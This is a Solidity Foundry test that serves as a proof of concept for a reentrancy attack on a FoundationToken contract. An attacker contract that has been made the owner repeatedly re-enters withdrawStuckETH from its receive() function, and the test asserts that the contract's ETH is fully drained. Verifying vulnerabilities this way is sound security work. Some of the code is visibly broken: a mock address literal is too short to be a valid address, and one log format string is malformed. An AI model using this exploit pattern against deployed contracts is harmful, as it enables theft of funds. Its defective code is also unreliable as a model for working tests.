// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/FoundationToken.sol";

contract ReentrantOwner {
    FoundationToken public token;
    uint256 public callbackCount;

    constructor(FoundationToken _token) {
        token = _token;
    }

    function attack() external {
        token.withdrawStuckETH();
    }

    receive() external payable {
        callbackCount++;
        if (callbackCount < 5) {
            token.withdrawStuckETH();
        }
    }
}

contract FoundationTokenReentrancyTest is Test {
    FoundationToken public token;
    ReentrantOwner public attacker;
    address owner = makeAddr("owner");
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function setUp() public {
        // Mock Uniswap function calls needed during deployment
        vm.record();
        
        // Mock router responses
        address mockFactory = address(0xf);
        address mockWETH = address(0x0d500B1d8E8eF31E21C99d1d9d644a);
        vm.mockCall(
            ROUTER,
            abi.encodeWithSelector(0xc45a0155), // factory()
            abi.encode(mockFactory)
        );
        vm.mockCall(
            ROUTER,
            abi.encodeWithSelector(0xad5c4648), // WETH()
            abi.encode(mockWETH)
        );
        vm.mockCall(
            mockFactory,
            abi.encodeWithSelector(0xc9c65396), // createPair(address,address)
            abi.encode(address(0xdead))
        );

        // Deploy token from owner address
        vm.startPrank(owner);
        token = new FoundationToken();
        vm.stopPrank();

        // Create attacker contract that will become the owner
        attacker = new ReentrantOwner(token);
        
        // Transfer ownership to the attacker
        vm.prank(owner);
        token.transferOwnership(address(attacker));
    }

    function testReentrancyVulnerability() public {
        // Fund token contract with ETH
        uint256 initialTokenBalance = 1 ether;
        vm.deal(address(token), initialTokenBalance);

        console.log("--- BEFORE-Trigger Attack ---");
        uint256 tokenETHBefore = address(token).balance;
        uint256 attackerETHBefore = address(attacker).balance;
        uint256 callbackBefore = attacker.callbackCount();
        console.log("Token ETH balance before: %s", tokenETHBefore);
        console.log("Attacker ETH balance before: %s", attackerETHBefore);
        console.log("Callback count before: %s", callbackBefore);
        console.log("");

        // Attempt reentrancy attack
        console.log("--- Trigger Attack ---");
        attacker.attack();
        console.log("");

        console.log("--- AFTER-Trigger Attack ---");
        uint256 tokenETHAfter = address(token).balance;
        uint256 attackerETHAfter = address(attacker).balance;
        uint256 callbackAfter = attacker.callbackCount();
        console.log("Token ETH balance after: %s", tokenETHAfter);
        console.log("Attacker ETH balance after: %s", attackerETHAfter);
        console.log("Callback count after: %s", callbackAfter);
        console.log("");

        // Capture ETH balance changes
        uint256 tokenDrained = tokenETHBefore - tokenETHAfter;
        uint256 attackerGained = attackerETHAfter - attackerETHBefore;
        
        // Validate vulnerability via differential check
        bool ethSuccessfullyDrained = tokenDrained == initialTokenBalance;
        bool ethFullyTransferredToAttacker = attackerGained == tokenDrained;
        bool reentrancyOccurred = callbackAfter > callbackBefore;
        
        console.log("--- Vulnerability Verification ---");
        console.log("ETH drained from token: %s (%ses)", 
            tokenDrained, 
            ethSuccessfullyDrained ? "SUCCESS - " : "FAILURE - "
        );
        console.log("ETH transferred to attacker: %s (%s)", 
            attackerGained, 
            ethFullyTransferredToAttacker ? "MATCHED" : "UNMATCHED"
        );
        console.log("Reentrancy occurred: %s", 
            reentrancyOccurred ? "YES" : "NO"
        );
        
        // Final vulnerability verdict
        if(ethSuccessfullyDrained && ethFullyTransferredToAttacker && reentrancyOccurred) {
            console.log("Vulnerability Exists: Reentrancy attack successfully drained funds");
        } else {
            console.log("Vulnerability not Exist: Reentrancy attack failed to drain funds");
        }

        // Original validation assertions
        assertEq(tokenETHAfter, 0, "ETH not fully drained from token contract");
        assertEq(attackerETHAfter, initialTokenBalance + attackerETHBefore, "Attacker should have all drained ETH");
        assertGt(attacker.callbackCount(), 0, "Reentrancy callbacks did not occur");
    }
}